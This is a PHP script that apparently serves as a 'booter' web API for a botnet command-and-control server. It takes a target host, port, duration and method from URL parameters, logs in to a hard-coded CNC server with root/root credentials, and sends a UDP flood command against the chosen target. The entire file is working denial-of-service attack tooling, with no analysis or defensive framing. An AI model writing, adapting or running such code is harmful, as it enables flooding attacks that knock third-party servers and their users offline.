<?php
//API Link: http://ServerIP/API.php?&host=$host&port=$port&time=$time&type=$method
set_time_limit(0);
 
$server = "1.1.1.1";
$conport = 1337;
$username = "root";
$password = "root";
 
$activekeys = array();
 
$method = $_GET['type'];
$target = $_GET['host'];
$port = $_GET['port'];
$time = $_GET['time'];
 
if($method == "UDP"){$command = "!* UDP $target $port $time 1420";}
 
$sock = fsockopen($server, $conport, $errno, $errstr, 2);
 
if(!$sock){
        echo "Couldn't Connect To CNC Server...";
} else{
        print(fread($sock, 512)."\n");
        fwrite($sock, $username . "\n");
        echo "<br>";
        print(fread($sock, 512)."\n");
        fwrite($sock, $password . "\n");
        echo "<br>";
        if(fread($sock, 512)){
                print(fread($sock, 512)."\n");
        }
 
        fwrite($sock, $command . "\n");
        fclose($sock);
        echo "<br>";
        echo "> $command ";
}
?>